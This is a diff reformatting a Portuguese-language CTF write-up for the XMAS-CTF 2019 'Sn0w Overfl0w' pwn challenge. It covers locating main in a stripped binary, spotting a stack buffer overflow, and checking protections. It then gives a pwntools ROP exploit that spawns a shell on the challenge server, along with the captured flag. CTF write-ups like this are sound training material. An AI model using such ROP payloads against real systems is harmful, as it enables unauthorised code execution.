@@ -1,6 +1,5 @@
-Writeup da challenge "Sn0w Overfl0w" do XMAS-CTF 2019
-
-==================================================================
+# Writeup "Sn0w Overfl0w" - XMAS-CTF 2019
+## Categories: pwn, Return Oriented Programming (ROP), Buffer Overflow (BOF), leaking libc
 
 A challenge nos oferece apenas um binário que o nomearemos como "chall".
 
@@ -19,7 +18,9 @@ puts("Mhmmm... Boring..."Mhmmm... Boring...)
 
 Na verdade, teriamos que introduzir o "yes" de forma que o caractere newline ("\n") nao entrasse no input, de forma que o strcmp retornasse true, porém todo esse processo demonstrou-se desnecessário ao analisarmos o binário com GDB e descobrirmos um buffer overflow no binário.
 
+## Binário Stripped
 Como se trata de um binário stripped, teremos que achar a função main manualmente, podemos fazer isso da seguinte forma:
+```
 1. fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# gdb ./chall
 2. gef➤  info file
    Symbols from "/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall".
@@ -56,15 +57,15 @@ Como se trata de um binário stripped, teremos que achar a função main manualm
       0x4010af:    nop
       0x4010b0:    mov    eax,0x404040
       0x4010b5:    cmp    rax,0x404040
-
+```
 Ok, o endereço do começo de main() é 0x401167. Mas como exatamente descobrimos isso?
 No passo 2 e 3, obtemos e setamos um breakpoint para o entry point do binário, oque nada mais é que o ponto de entrada do programa, ali encontram-se as primeiras instruções de um binário, pois bem o push do endereço de main para __libc_start_main.
 __libc_start_main será setado posteriormente, enquanto isso, podemos apenas assumir, que a chamada feita em 0x401098 se trata de uma "call __libc_start_main" e receberia como argumento 0x401167, o qual é mov'ido para o primeiro general purpose register $rdi a fim de ser usado como argumento para a função __libc_start_main. Logo, 0x401167 é o endereço de início da nossa função main.
 
-########## Entendendo o Execution Flow do programa e Identificando Buffer Overflow ###########
+## Entendendo o Execution Flow do programa e Identificando Buffer Overflow
 Com a função main em mãos, podemos analisar ela via ghidra.
 A função main decompilada se comporta da seguinte maneira:
-
+```
 undefined8 FUN_00401167(void)
 
 {
@@ -84,10 +85,10 @@ undefined8 FUN_00401167(void)
   }
   return 0;
 }
-
-É explícito a existência de um buffer overflow ao ler 100bytes de dados para uma variavel que suporta apenas 10.
+```
+É explícita a existência de um buffer overflow ao ler 100bytes de dados para uma variavel que suporta apenas 10.
 Possuindo um BOF no binário, podemos pular para a parte da exploração, porem antes disso, precisamos checkar as proteções que o binário possúi:
-
+```
 fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# checksec ./chall 
 [*] '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall'
     Arch:     amd64-64-little
@@ -95,11 +96,12 @@ fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# checksec ./chall
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-
+```
 "NX Enabled", No Execute esta ativado, isto é, a stack inteira se torna read-only, impossibilitando o clássico ataque de buffer-overflow consistindo na "alocação" e chamada do shellcode na stack.
 A fim de burlarmos tal proteção, faremos um ataque do tipo Return Oriented Programming (ROP).
 
 Nosso exploit final ficará da seguinte forma:
+```
 from pwn import *
 
 p = remote("challs.xmas.htsp.ro", 12006)
@@ -138,7 +140,10 @@ xpl = pad + p64(RET) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
 p.sendlineafter("snowmen?", xpl)
 
 p.interactive()
+```
 
+## Pwning!!
+```
 fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# python xpl.py      
 [+] Opening connection to challs.xmas.htsp.ro on port 12006: Done
 [*] '/home/fex0r/.ctf/xmas-ctf/writeups/sn0w-overfl0w/chall'
@@ -166,3 +171,4 @@ fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# python xpl.py
 Mhmmm... Boring...
 $ cat flag.txt
 X-MAS{700_much_5n0000w}
+```
